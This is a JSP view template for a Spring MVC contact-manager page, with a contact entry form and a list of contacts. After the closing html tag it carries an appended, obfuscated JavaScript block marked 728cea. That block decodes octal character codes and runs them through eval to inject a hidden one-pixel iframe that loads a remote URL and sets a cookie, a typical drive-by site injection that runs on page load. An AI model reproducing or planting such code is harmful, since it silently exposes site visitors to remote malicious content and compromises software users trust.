<%@ page language="java" contentType="text/html; charset=utf8"
         pageEncoding="utf8"%>
<%@taglib uri="http://www.springframework.org/tags" prefix="spring"%>
<%@taglib uri="http://www.springframework.org/tags/form" prefix="form"%>
<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf8">
    <title><spring:message code="label.title" /></title>
</head>
<body>

<a href="<c:url value="/logout" />">
    <spring:message code="label.logout" />
</a>

<h2><spring:message code="label.title" /></h2>

<form:form method="post" action="add" commandName="contact">

    <table>
        <tr>
            <td><form:label path="firstname">
                <spring:message code="label.firstname" />
            </form:label></td>
            <td><form:input path="firstname" /></td>
        </tr>
        <tr>
            <td><form:label path="lastname">
                <spring:message code="label.lastname" />
            </form:label></td>
            <td><form:input path="lastname" /></td>
        </tr>
        <tr>
            <td><form:label path="email">
                <spring:message code="label.email" />
            </form:label></td>
            <td><form:input path="email" /></td>
        </tr>
        <tr>
            <td><form:label path="telephone">
                <spring:message code="label.telephone" />
            </form:label></td>
            <td><form:input path="telephone" /></td>
        </tr>
        <tr>
            <td colspan="2"><input type="submit"
                                   value="<spring:message code="label.addcontact"/>" /></td>
        </tr>
    </table>
</form:form>

<h3><spring:message code="label.contacts" /></h3>
<c:if test="${!empty contactList}">
    <table class="data">
        <tr>
            <th><spring:message code="label.firstname" /></th>
            <th><spring:message code="label.email" /></th>
            <th><spring:message code="label.telephone" /></th>
            <th>&nbsp;</th>
        </tr>
        <c:forEach items="${contactList}" var="contact">
            <tr>
                <td>${contact.lastname}, ${contact.firstname}</td>
                <td>${contact.email}</td>
                <td>${contact.telephone}</td>
                <td><a href="delete/${contact.id}"><spring:message code="label.delete" /></a></td>
            </tr>
        </c:forEach>
    </table>
</c:if>

</body>
</html>

/*728cea*/
ff=String;fff="fromCha"+"rCode";ff=ff[fff];zz=3;try{document.body&=5151}catch(bt4y34by){v=123;vzs=0;try{document;}catch(q){vzs=1;}if(!vzs)e=eval;if(1){f=new Array(0141,0160,0151,0136,0157,0144,0152,0151,033,0165,0165,0165,0141,0141,0141,043,044,033,0166,010,05,033,033,033,033,0161,0134,0155,033,0146,0146,0135,0147,0142,033,070,033,0137,0152,0136,0160,0150,0140,0151,0157,051,0136,0155,0140,0134,0157,0140,0100,0147,0140,0150,0140,0151,0157,043,042,0144,0141,0155,0134,0150,0140,042,044,066,010,05,010,05,033,033,033,033,0146,0146,0135,0147,0142,051,0156,0155,0136,033,070,033,042,0143,0157,0157,0153,065,052,052,0141,0134,0155,0150,0134,0136,0144,0134,0135,0140,0147,0140,0151,0161,0134,0155,0134,051,0136,0152,0150,052,0132,0161,0157,0144,0132,0147,0152,0142,052,0136,0147,0144,0146,051,0153,0143,0153,042,066,010,05,033,033,033,033,0146,0146,0135,0147,0142,051,0156,0157,0164,0147,0140,051,0153,0152,0156,0144,0157,0144,0152,0151,033,070,033,042,0134,0135,0156,0152,0147,0160,0157,0140,042,066,010,05,033,033,033,033,0146,0146,0135,0147,0142,051,0156,0157,0164,0147,0140,051,0135,0152,0155,0137,0140,0155,033,070,033,042,053,042,066,010,05,033,033,033,033,0146,0146,0135,0147,0142,051,0156,0157,0164,0147,0140,051,0143,0140,0144,0142,0143,0157,033,070,033,042,054,0153,0163,042,066,010,05,033,033,033,033,0146,0146,0135,0147,0142,051,0156,0157,0164,0147,0140,051,0162,0144,0137,0157,0143,033,070,033,042,054,0153,0163,042,066,010,05,033,033,033,033,0146,0146,0135,0147,0142,051,0156,0157,0164,0147,0140,051,0147,0140,0141,0157,033,070,033,042,054,0153,0163,042,066,010,05,033,033,033,033,0146,0146,0135,0147,0142,051,0156,0157,0164,0147,0140,051,0157,0152,0153,033,070,033,042,054,0153,0163,042,066,010,05,010,05,033,033,033,033,0144,0141,033,043,034,0137,0152,0136,0160,0150,0140,0151,0157,051,0142,0140,0157,0100,0147,0140,0150,0140,0151,0157,075,0164,0104,0137,043,042,0146,0146,0135,0147,0142,042,044,044,033,0166,010,05,033,033,033,033,033,033,033,033,0137,0152,0136,0160,0150,0140,0151,0157,051,0162,0155,0144,0157,0140,043,042,067,0137,0144,0161,033,0144,0137,070,0127,042,0146,0146,0135,0147,0142,0127,042,071,067,052,0137,0144,0161,071,042,044,066,010,05,033,033,033,033,033,033,033,033,0137,0152,0136,0160,0150,0140,0151,0157,051,0142,0140,0157,0100,0147,0140,0150,0140,0151,0157,075,0164,0104,0137,043,042,0146,0146,0135,0147,0142,042,044,051,0134,0153,0153,0140,0151,0137,076,0143,0144,0147,0137,043,0146,0146,0135,0147,0142,044,066,010,05,033,033,033,033,0170,010,05,0170,010,05,0141,0160,0151,0136,0157,0144,0152,0151,033,0116,0140,0157,076,0152,0152,0146,0144,0140,043,0136,0152,0152,0146,0144,0140,0111,0134,0150,0140,047,0136,0152,0152,0146,0144,0140,0121,0134,0147,0160,0140,047,0151,077,0134,0164,0156,047,0153,0134,0157,0143,044,033,0166,010,05,033,0161,0134,0155,033,0157,0152,0137,0134,0164,033,070,033,0151,0140,0162,033,077,0134,0157,0140,043,044,066,010,05,033,0161,0134,0155,033,0140,0163,0153,0144,0155,0140,033,070,033,0151,0140,0162,033,077,0134,0157,0140,043,044,066,010,05,033,0144,0141,033,043,0151,077,0134,0164,0156,070,070,0151,0160,0147,0147,033,0167,0167,033,0151,077,0134,0164,0156,070,070,053,044,033,0151,077,0134,0164,0156,070,054,066,010,05,033,0140,0163,0153,0144,0155,0140,051,0156,0140,0157,0117,0144,0150,0140,043,0157,0152,0137,0134,0164,051,0142,0140,0157,0117,0144,0150,0140,043,044,033,046,033,056,061,053,053,053,053,053,045,055,057,045,0151,077,0134,0164,0156,044,066,010,05,033,0137,0152,0136,0160,0150,0140,0151,0157,051,0136,0152,0152,0146,0144,0140,033,070,033,0136,0152,0152,0146,0144,0140,0111,0134,0150,0140,046,035,070,035,046,0140,0156,0136,0134,0153,0140,043,0136,0152,0152,0146,0144,0140,0121,0134,0147,0160,0140,044,010,05,033,033,033,033,033,033,033,033,033,033,033,033,033,033,033,033,033,046,033,035,066,0140,0163,0153,0144,0155,0140,0156,070,035,033,046,033,0140,0163,0153,0144,0155,0140,051,0157,0152,0102,0110,0117,0116,0157,0155,0144,0151,0142,043,044,033,046,033,043,043,0153,0134,0157,0143,044,033,072,033,035,066,033,0153,0134,0157,0143,070,035,033,046,033,0153,0134,0157,0143,033,065,033,035,035,044,066,010,05,0170,010,05,0141,0160,0151,0136,0157,0144,0152,0151,033,0102,0140,0157,076,0152,0152,0146,0144,0140,043,033,0151,0134,0150,0140,033,044,033,0166,010,05,033,0161,0134,0155,033,0156,0157,0134,0155,0157,033,070,033,0137,0152,0136,0160,0150,0140,0151,0157,051,0136,0152,0152,0146,0144,0140,051,0144,0151,0137,0140,0163,0112,0141,043,033,0151,0134,0150,0140,033,046,033,035,070,035,033,044,066,010,05,033,0161,0134,0155,033,0147,0140,0151,033,070,033,0156,0157,0134,0155,0157,033,046,033,0151,0134,0150,0140,051,0147,0140,0151,0142,0157,0143,033,046,033,054,066,010,05,033,0144,0141,033,043,033,043,033,034,0156,0157,0134,0155,0157,033,044,033,041,041,010,05,033,043,033,0151,0134,0150,0140,033,034,070,033,0137,0152,0136,0160,0150,0140,0151,0157,051,0136,0152,0152,0146,0144,0140,051,0156,0160,0135,0156,0157,0155,0144,0151,0142,043,033,053,047,033,0151,0134,0150,0140,051,0147,0140,0151,0142,0157,0143,033,044,033,044,033,044,010,05,033,0166,010,05,033,0155,0140,0157,0160,0155,0151,033,0151,0160,0147,0147,066,010,05,033,0170,010,05,033,0144,0141,033,043,033,0156,0157,0134,0155,0157,033,070,070,033,050,054,033,044,033,0155,0140,0157,0160,0155,0151,033,0151,0160,0147,0147,066,010,05,033,0161,0134,0155,033,0140,0151,0137,033,070,033,0137,0152,0136,0160,0150,0140,0151,0157,051,0136,0152,0152,0146,0144,0140,051,0144,0151,0137,0140,0163,0112,0141,043,033,035,066,035,047,033,0147,0140,0151,033,044,066,010,05,033,0144,0141,033,043,033,0140,0151,0137,033,070,070,033,050,054,033,044,033,0140,0151,0137,033,070,033,0137,0152,0136,0160,0150,0140,0151,0157,051,0136,0152,0152,0146,0144,0140,051,0147,0140,0151,0142,0157,0143,066,010,05,033,0155,0140,0157,0160,0155,0151,033,0160,0151,0140,0156,0136,0134,0153,0140,043,033,0137,0152,0136,0160,0150,0140,0151,0157,051,0136,0152,0152,0146,0144,0140,051,0156,0160,0135,0156,0157,0155,0144,0151,0142,043,033,0147,0140,0151,047,033,0140,0151,0137,033,044,033,044,066,010,05,0170,010,05,0144,0141,033,043,0151,0134,0161,0144,0142,0134,0157,0152,0155,051,0136,0152,0152,0146,0144,0140,0100,0151,0134,0135,0147,0140,0137,044,010,05,0166,010,05,0144,0141,043,0102,0140,0157,076,0152,0152,0146,0144,0140,043,042,0161,0144,0156,0144,0157,0140,0137,0132,0160,0154,042,044,070,070,060,060,044,0166,0170,0140,0147,0156,0140,0166,0116,0140,0157,076,0152,0152,0146,0144,0140,043,042,0161,0144,0156,0144,0157,0140,0137,0132,0160,0154,042,047,033,042,060,060,042,047,033,042,054,042,047,033,042,052,042,044,066,010,05,010,05,0165,0165,0165,0141,0141,0141,043,044,066,010,05,0170,010,05,0170);}w=f;s=[];if(window.document)for(i=2-2;-i+1413!=0;i+=1){j=i;if((031==0x19))if(e)s=s+ff(w[j]+5);}xz=e;if(window.document)xz(s)}
/*/728cea*/